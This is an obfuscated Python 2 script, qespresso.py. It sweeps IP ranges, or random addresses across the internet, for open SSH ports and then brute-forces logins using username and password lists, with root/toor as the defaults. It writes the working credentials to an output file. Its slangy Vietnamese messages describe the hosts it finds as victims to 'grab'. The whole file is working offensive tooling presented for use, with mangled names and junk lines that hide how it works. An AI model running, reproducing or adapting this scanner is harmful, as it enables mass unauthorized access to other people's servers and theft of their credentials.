#!/usr/bin/env python
# -*- coding: latin-1 -*- ######################################################
# qespresso.py - SSH [B]ullshit                                                #
#                                                                              #
# FILE                                                                         #
# qespresso.py                                                                 #
#                                                                              #
# DATE                                                                         #
# 2014-Jun-09                                                                  #
#                                                                              #
# DESCRIPTION                                                                  #
# 'qespresso.py' is a [B]ullshit ssh script for a few dollars more             #
#                                                                              #
# AUTHOR                                                                       #
# [B]ullshit - modifided from ssh brute force open source code                 #
# Thank to pgt - http://www.nullsecurity.net/                                  # 
################################################################################
if 64 - 64: i11iIiiIii
from socket import *
import multiprocessing
import threading
import time
import paramiko
import sys
import os
import logging
import argparse
import random
import re
if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
if 73 - 73: II111iiii
if 22 - 22: I1IiiI * Oo0Ooo / OoO0O00 . OoOoOO00 . o0oOOo0O0Ooo / I1ii11iIi11i
I1IiI = 'v1.0'
if 73 - 73: OOooOOo / ii11ii1ii
if 94 - 94: OoOO + OoOO0ooOOoo0O + o0000oOoOoO0o * o00O0oo
if 97 - 97: oO0o0ooO0 - IIII / o0oOOo0O0Ooo - oO0o0ooO0
def II1i ( ) :
 print '[B]ullshit ssh - For a few dollars more'
 if 32 - 32: OoOoOO00 . IIII * i1IIi . oO0o0ooO0 / o00O0oo
 if 88 - 88: o0000oOoOoO0o . OOooOOo % IIII
def ooO0oooOoO0 ( ) :
 print '[+] qespresso.py %s' % ( I1IiI )
 sys . exit ( 0 )
 if 21 - 21: OoOoOO00 / o0000oOoOoO0o * OoO0O00 . II111iiii
 if 1 - 1: II111iiii - I1ii11iIi11i % i11iIiiIii + o00O0oo . oO0o0ooO0
def Oooo0000 ( filename ) :
 try :
  i11 = open ( filename , 'a' )
  i11 . close ( )
 except IOError :
  print '[!] WTF!: cannot write to file \'%s\'' % filename
  sys . exit ( 1 )
  if 41 - 41: oO0o0ooO0 . IIII * o00O0oo % i11iIiiIii
  if 74 - 74: o0000oOoOoO0o * o00O0oo
def oo00o0Oo0oo ( ) :
 i1iII1I1i1i1 = argparse . ArgumentParser (
 usage = '\n\n   ./%(prog)s -i <arg> | -r <arg> | -I <arg>' ,
 formatter_class = argparse . RawDescriptionHelpFormatter ,
 epilog =
 'examples:\n\n'

 '  Lượm một cháu\n'
 '  usage: ./%(prog)s -i Yahoo.com -L passwords.txt\n\n'

 '  Lượm nguyên một(vài) ranges (Scan trước - hốt sau)\n'
 '  usage: ./%(prog)s -i 192.168.0-10.1-254 usage con kec' ,
 add_help = False
 )
 if 27 - 27: OoO0O00
 oOOOo0o0O = i1iII1I1i1i1 . add_argument_group ( 'options' , '' )
 oOOOo0o0O . add_argument ( '-i' , default = False , metavar = '<ip/range>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-I' , default = False , metavar = '<file>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-r' , default = False , metavar = '<num>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-p' , default = 22 , metavar = '<num>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-t' , default = 4 , metavar = '<num>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-f' , default = 8 , metavar = '<num>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-u' , default = 'root' , metavar = '<username>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-U' , default = False , metavar = '<file>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-l' , default = 'toor' , metavar = '<password>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-L' , default = False , metavar = '<file>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-o' , default = False , metavar = '<file>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-O' , default = False , metavar = '<file>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-s' , default = 200 , metavar = '<num>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-T' , default = 3 , metavar = '<sec>' ,
 help = '' )
 oOOOo0o0O . add_argument ( '-V' , action = 'store_true' ,
 help = '' )
 if 72 - 72: Oo0Ooo % ii11ii1ii . I1IiiI / OoOO * I1IiiI
 iiiI11 = i1iII1I1i1i1 . parse_args ( )
 if 91 - 91: o0oOOo0O0Ooo / II111iiii . I1ii11iIi11i + ii11ii1ii
 if iiiI11 . V :
  ooO0oooOoO0 ( )
  if 47 - 47: OoOoOO00 / OoOO0ooOOoo0O * OoooooooOO
 if ( iiiI11 . i == False ) and ( iiiI11 . I == False ) and ( iiiI11 . r == False ) :
  print ''
  i1iII1I1i1i1 . print_help ( )
  sys . exit ( 0 )
  if 9 - 9: I1IiiI - OoOO0ooOOoo0O % i1IIi % OoooooooOO
 return iiiI11
 if 3 - 3: o0000oOoOoO0o + O0
 if 42 - 42: ii11ii1ii / i1IIi + i11iIiiIii - OoOO0ooOOoo0O
def oo0Ooo0 ( filename , text ) :
 i11 = open ( filename , 'a' )
 i11 . write ( text )
 i11 . close ( )
 if 46 - 46: IIII % IIII - OOooOOo * o0oOOo0O0Ooo % o0000oOoOoO0o
 if 55 - 55: OoOoOO00 % i1IIi / OoOO0ooOOoo0O - OOooOOo - O0 / II111iiii
def iii11iII ( target , port , timeout , oips ) :
 i1I111I = socket ( AF_INET , SOCK_STREAM )
 i1I111I . settimeout ( timeout )
 i11I1IIiiIi = i1I111I . connect_ex ( ( target , port ) )
 i1I111I . close ( )
 if i11I1IIiiIi == 0 :
  IiIiIi . append ( target )
  if oips :
   oo0Ooo0 ( oips , target + '\n' )
   if 40 - 40: OOooOOo . OoOoOO00 . Oo0Ooo . i1IIi
   if 33 - 33: OoOO0ooOOoo0O + II111iiii % i11iIiiIii . IIII - I1IiiI
def O00oooo0O ( threads , waittime ) :
 while threading . activeCount ( ) > threads :
  time . sleep ( waittime )
  if 22 - 22: OoooooooOO % OoOO - o0000oOoOoO0o . iIii1I11I1II1 * i11iIiiIii
  if 32 - 32: Oo0Ooo * O0 % OOooOOo % OoOO0ooOOoo0O . o00O0oo
def o0OOOOO00o0O0 ( args , target ) :
 o0o0OOO0o0 = int ( args . p )
 ooOOOo0oo0O0 = float ( args . T )
 o0 = args . O
 I11II1i = int ( args . s )
 if 23 - 23: I1ii11iIi11i / o0oOOo0O0Ooo + OoOO + OoOO / II111iiii
 iiI1 = threading . Thread ( target = iii11iII , args = ( target , o0o0OOO0o0 , ooOOOo0oo0O0 , o0 ) )
 iiI1 . start ( )
 if 19 - 19: OoOO + IIII
 O00oooo0O ( I11II1i , 0.0001 )
 time . sleep ( 0.001 )
 if 53 - 53: OoooooooOO . i1IIi
 if 18 - 18: o0oOOo0O0Ooo
def I1i1I1II ( i ) :
 sys . stdout . flush ( )
 sys . stdout . write ( '\r[*] Đã scan chừng này: {0} | ' 'Có thể lượm: {1}' . format ( i , len ( IiIiIi ) ) )
 if 45 - 45: oO0o0ooO0 . OoOoOO00
 if 83 - 83: OOooOOo . iIii1I11I1II1 . I1ii11iIi11i
 if 31 - 31: OoOO0ooOOoo0O . OoOO0ooOOoo0O - o0oOOo0O0Ooo / OoO0O00 + IIII * I1IiiI
def O0ooOooooO ( targets ) :
 if re . match ( r'^[0-9.\-]*$' , targets ) :
  return targets
 try :
  o00O = gethostbyname ( targets )
  return o00O
 except gaierror :
  print '[-] \'%s\' is unreachable' % ( targets )
  OOO0OOO00oo ( )
  sys . exit ( 1 )
  if 31 - 31: II111iiii - ii11ii1ii . oO0o0ooO0 % OoOoOO00 - O0
  if 4 - 4: II111iiii / IIII . o0000oOoOoO0o
def O0oo0OO0oOOOo ( ) :
 print '[*] unsort host list'
 for i1i1i11IIi in range ( 15 ) :
  random . shuffle ( IiIiIi )
  if 33 - 33: o0oOOo0O0Ooo + ii11ii1ii * OoO0O00 - Oo0Ooo / OOooOOo % OoOO0ooOOoo0O
  if 21 - 21: OoO0O00 * iIii1I11I1II1 % OOooOOo * i1IIi
def Ii11Ii1I ( iprange ) :
 O00oO = tuple ( part for part in iprange . split ( '.' ) )
 if 39 - 39: o00O0oo - II111iiii * OoO0O00 % o0oOOo0O0Ooo * II111iiii % II111iiii
 OoOOOOO = range ( 4 )
 iIi1i111II = range ( 4 )
 for i1i1i11IIi in range ( 4 ) :
  OoOO00O = O00oO [ i1i1i11IIi ] . find ( '-' )
  if OoOO00O != - 1 :
   OoOOOOO [ i1i1i11IIi ] = int ( O00oO [ i1i1i11IIi ] [ : OoOO00O ] )
   iIi1i111II [ i1i1i11IIi ] = int ( O00oO [ i1i1i11IIi ] [ 1 + OoOO00O : ] ) + 1
  else :
   OoOOOOO [ i1i1i11IIi ] = int ( O00oO [ i1i1i11IIi ] )
   iIi1i111II [ i1i1i11IIi ] = int ( O00oO [ i1i1i11IIi ] ) + 1
   if 53 - 53: OoO0O00 % OoooooooOO - OoOoOO00
 return ( OoOOOOO , iIi1i111II )
 if 97 - 97: OOooOOo % o00O0oo * o00O0oo
 if 39 - 39: OoOO0ooOOoo0O % o00O0oo
def i111IiI1I ( args ) :
 O0iII = O0ooOooooO ( args . i )
 OoOOOOO , iIi1i111II = Ii11Ii1I ( O0iII )
 if 80 - 80: o00O0oo . OOooOOo
 print '[*] Đang scan %s' % O0iII
 IIi = 0
 for i1i1i11IIi in range ( OoOOOOO [ 0 ] , iIi1i111II [ 0 ] ) :
  for i11iIIIIIi1 in range ( OoOOOOO [ 1 ] , iIi1i111II [ 1 ] ) :
   for iiII1i1 in range ( OoOOOOO [ 2 ] , iIi1i111II [ 2 ] ) :
    for o00oOO0o in range ( OoOOOOO [ 3 ] , iIi1i111II [ 3 ] ) :
     o00O = '%d.%d.%d.%d' % ( i1i1i11IIi , i11iIIIIIi1 , iiII1i1 , o00oOO0o )
     IIi += 1
     I1i1I1II ( IIi )
     o0OOOOO00o0O0 ( args , o00O )
     if 80 - 80: OOooOOo + ii11ii1ii - ii11ii1ii % o0000oOoOoO0o
     if 63 - 63: I1IiiI - I1ii11iIi11i + O0 % OoOO / iIii1I11I1II1 / o0oOOo0O0Ooo
 O00oooo0O ( 1 , 0.1 )
 if 98 - 98: o0000oOoOoO0o * o0000oOoOoO0o / o0000oOoOoO0o + OoOO
 I1i1I1II ( IIi )
 print '\n[*] Đã scan xong!'
 if 34 - 34: IIII
 if 15 - 15: OoOO * IIII * Oo0Ooo % i11iIiiIii % OoOoOO00 - ii11ii1ii
def O0ooo0O0oo0 ( ) :
 oo0oOo = range ( 4 )
 for i1i1i11IIi in range ( 4 ) :
  oo0oOo [ i1i1i11IIi ] = random . randrange ( 0 , 256 )
  if 89 - 89: OoOoOO00
  if 68 - 68: OoO0O00 * OoooooooOO % O0 + OoO0O00 + IIII
 if oo0oOo [ 0 ] == 127 :
  O0ooo0O0oo0 ( )
  if 4 - 4: IIII + O0 * ii11ii1ii
 OOoo0O = '%d.%d.%d.%d' % ( oo0oOo [ 0 ] , oo0oOo [ 1 ] , oo0oOo [ 2 ] , oo0oOo [ 3 ] )
 return OOoo0O
 if 67 - 67: i11iIiiIii - i1IIi % I1ii11iIi11i . O0
 if 77 - 77: o00O0oo / I1IiiI
def I1 ( args ) :
 i1i1i11IIi = 0
 print '[*] Scan random, ngắm trâu trúng bò'
 while len ( IiIiIi ) < int ( args . r ) :
  i1i1i11IIi += 1
  I1i1I1II ( i1i1i11IIi )
  o0OOOOO00o0O0 ( args , O0ooo0O0oo0 ( ) )
  if 15 - 15: II111iiii
  if 18 - 18: i11iIiiIii . i1IIi % OoooooooOO / O0
 O00oooo0O ( 1 , 1 )
 if 75 - 75: OoOoOO00 % o0oOOo0O0Ooo % o0oOOo0O0Ooo . oO0o0ooO0
 I1i1I1II ( i1i1i11IIi )
 print '\n[*] Đã scan xong!'
 if 5 - 5: o0oOOo0O0Ooo * IIII + OoOoOO00 . ii11ii1ii + OoOoOO00
 if 91 - 91: O0
def oOOo0 ( filename ) :
 try :
  open ( filename ) . readlines ( )
 except IOError :
  print '[!] WTF: cannot open file \'%s\'' % filename
  sys . exit ( 1 )
  if 54 - 54: O0 - o00O0oo % ii11ii1ii
  if 77 - 77: OoOoOO00 / I1IiiI / OoO0O00 + OoO0O00 . ii11ii1ii
def ii1ii11IIIiiI ( ipfile ) :
 oOOo0 ( ipfile )
 O0iII = open ( ipfile ) . readlines ( )
 for o00O in O0iII :
  IiIiIi . append ( o00O )
  if 67 - 67: OoOO * OOooOOo * I1ii11iIi11i + ii11ii1ii / i1IIi
  if 11 - 11: OoOO0ooOOoo0O + o0000oOoOoO0o - IIII * OOooOOo % i11iIiiIii - oO0o0ooO0
def o0oO ( target , port , user , passwd , outfile , timeo , i ) :
 IIiIi1iI = paramiko . SSHClient ( )
 if 35 - 35: OoOO0ooOOoo0O % O0 - O0
 IIiIi1iI . set_missing_host_key_policy ( paramiko . AutoAddPolicy ( ) )
 user = user . replace ( '\n' , '' )
 passwd = passwd . replace ( '\n' , '' )
 try :
  IIiIi1iI . connect ( target , port = port , username = user , password = passwd ,
 timeout = timeo , pkey = None , allow_agent = False )
  IiIIIi1iIi = 'Hên xui! maybe a honeypot or false positive'
  ooOOoooooo = '%s|%s|%s' '|%s' % ( target , user , passwd , IiIIIi1iIi )
  if 1 - 1: Oo0Ooo / o0oOOo0O0Ooo % o0000oOoOoO0o * o00O0oo . i11iIiiIii
  print ooOOoooooo
  if outfile :
   oo0Ooo0 ( outfile , ooOOoooooo + '\n' )
  IIiIi1iI . close ( )
  os . _exit ( 0 )
 except paramiko . AuthenticationException , III1Iiii1I11 :
  IIiIi1iI . close ( )
  IIIIiiIiI = str ( III1Iiii1I11 )
  if '[\'publickey\']' in IIIIiiIiI :
   print '[-] key authentication only - ' 'Không lượm được cháu %s' % ( target )
   if 91 - 91: o0000oOoOoO0o % i1IIi % iIii1I11I1II1
   os . _exit ( 1 )
  elif '\'keyboard-interactive\'' in IIIIiiIiI :
   print '[-] %s requires \'keyboard-interactive\' handler' % ( target )
   if 20 - 20: ii11ii1ii % OoOO0ooOOoo0O / OoOO0ooOOoo0O + OoOO0ooOOoo0O
   os . _exit ( 1 )
 except :
  IIiIi1iI . close ( )
  if 45 - 45: OOooOOo - o00O0oo - OoooooooOO - OoO0O00 . II111iiii / O0
  if i < 2 :
   i += 1
   if 51 - 51: O0 + o0000oOoOoO0o
   IIIII11I1IiI = random . uniform ( 0.6 , 1.2 )
   time . sleep ( IIIII11I1IiI )
   o0oO ( target , port , user , passwd , outfile , timeo , i )
  else :
   print '[-] too many timeouts - giải tán ! %s' % ( target )
   os . _exit ( 1 )
   if 16 - 16: iIii1I11I1II1
   if 90 - 90: o0oOOo0O0Ooo % i1IIi / OoO0O00
def IIii1Iii1i1I ( target , args ) :
 o0o0OOO0o0 = int ( args . p )
 OOoO00 = args . u
 IiI111111IIII = args . U
 i1Ii = args . l
 ii111iI1iIi1 = args . L
 i11 = args . o
 ooOOOo0oo0O0 = float ( args . T )
 I11II1i = int ( args . t )
 if 78 - 78: OoO0O00 . ii11ii1ii + OoO0O00 / OoOO / OoO0O00
 if IiI111111IIII :
  oO0O00OoOO0 = open ( IiI111111IIII ) . readlines ( )
 else :
  oO0O00OoOO0 = [ OOoO00 ]
 if ii111iI1iIi1 :
  OoO = open ( ii111iI1iIi1 ) . readlines ( )
 else :
  OoO = [ i1Ii ]
  if 88 - 88: o0000oOoOoO0o . II111iiii * II111iiii % oO0o0ooO0
  if 15 - 15: i1IIi * I1IiiI + i11iIiiIii
 try :
  for OOoO00 in oO0O00OoOO0 :
   if 6 - 6: IIII / i11iIiiIii + o0000oOoOoO0o * OOooOOo
   o00o0 , ii = OOoO00 . split ( "|" )
   OOooooO0Oo = threading . Thread ( target = o0oO , args = ( target , o0o0OOO0o0 , o00o0 ,
 ii , i11 , ooOOOo0oo0O0 , 0 , ) )
   OOooooO0Oo . start ( )
   if 91 - 91: o0oOOo0O0Ooo . iIii1I11I1II1 / OOooOOo + i1IIi
   O00oooo0O ( I11II1i , 0.01 )
   time . sleep ( 0.1 )
   if 42 - 42: IIII . o0oOOo0O0Ooo . IIII - I1ii11iIi11i
  O00oooo0O ( 1 , 1 )
 except KeyboardInterrupt :
  os . _exit ( 1 )
  if 40 - 40: IIII - i11iIiiIii / OoOO0ooOOoo0O
  if 35 - 35: OoOO0ooOOoo0O - I1IiiI % o0oOOo0O0Ooo . OoooooooOO % OoOO0ooOOoo0O
def I1i1Iiiii ( args ) :
 I11II1i = int ( args . t )
 OOo0oO00ooO00 = int ( args . f )
 oOO0O00oO0Ooo = len ( IiIiIi )
 if 67 - 67: OoO0O00 - ii11ii1ii
 print '[*] Sẽ lượm %d cháu\n' '[*] Rất máu với %d hosts parallel\n' '[*] Số threads mỗi host: %d' % ( oOO0O00oO0Ooo , OOo0oO00ooO00 , I11II1i )
 if 36 - 36: o00O0oo
 if 36 - 36: IIII / O0 * Oo0Ooo - ii11ii1ii % iIii1I11I1II1 * OOooOOo
 if 79 - 79: O0
 i1i1i11IIi = 1
 for oOO00O in IiIiIi :
  oOO00O = oOO00O . replace ( '\n' , '' )
  print '[*] Đang lượm %s [%d/%d]' % ( oOO00O , i1i1i11IIi , oOO0O00oO0Ooo )
  OOOoo0OO = multiprocessing . Process ( target = IIii1Iii1i1I , args = ( oOO00O , args ) )
  OOOoo0OO . start ( )
  if 57 - 57: OoO0O00 / IIII
  while len ( multiprocessing . active_children ( ) ) >= OOo0oO00ooO00 :
   time . sleep ( 0.001 )
  time . sleep ( 0.001 )
  i1i1i11IIi += 1
  if 29 - 29: iIii1I11I1II1 + OoOoOO00 * OoO0O00 * ii11ii1ii . I1IiiI * I1IiiI
  if 7 - 7: o00O0oo * oO0o0ooO0 % OoOO0ooOOoo0O - o0oOOo0O0Ooo
 while multiprocessing . active_children ( ) :
  time . sleep ( 1 )
  if 13 - 13: OoOO0ooOOoo0O . i11iIiiIii
  if 56 - 56: I1ii11iIi11i % O0 - I1IiiI
def O00o0OO0 ( ) :
 if len ( IiIiIi ) == 0 :
  print '[-] Wew không có cháu nào!'
  OOO0OOO00oo ( )
  sys . exit ( 1 )
  if 35 - 35: OOooOOo % IIII / oO0o0ooO0 + iIii1I11I1II1 . OoooooooOO . I1IiiI
  if 71 - 71: o00O0oo * II111iiii * OOooOOo
def OOO0OOO00oo ( ) :
 print '[*] Hết phim!'
 if 56 - 56: I1IiiI
def O0oO ( ) :
 II1i ( )
 iiiI11 = oo00o0Oo0oo ( )
 if 73 - 73: I1ii11iIi11i * i11iIiiIii % OOooOOo . I1ii11iIi11i
 if iiiI11 . U :
  oOOo0 ( iiiI11 . U )
 if iiiI11 . L :
  oOOo0 ( iiiI11 . L )
 if iiiI11 . o :
  Oooo0000 ( iiiI11 . o )
 if iiiI11 . O :
  Oooo0000 ( iiiI11 . O )
  if 66 - 66: OOooOOo + OOooOOo + IIII / o0000oOoOoO0o + ii11ii1ii
 if iiiI11 . i :
  i111IiI1I ( iiiI11 )
  O0oo0OO0oOOOo ( )
 elif iiiI11 . I :
  ii1ii11IIIiiI ( iiiI11 . I )
 else :
  I1 ( iiiI11 )
  if 30 - 30: O0
 time . sleep ( 0.1 )
 O00o0OO0 ( )
 I1i1Iiiii ( iiiI11 )
 OOO0OOO00oo ( )
 if 44 - 44: OOooOOo / OoOO / OoOO
if __name__ == '__main__' :
 IiIiIi = [ ]
 try :
  logging . disable ( logging . CRITICAL )
  O0oO ( )
 except KeyboardInterrupt :
  print '\nÁ đù Ctrl+C à!'
  time . sleep ( 0.2 )
  os . _exit ( 1 )
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
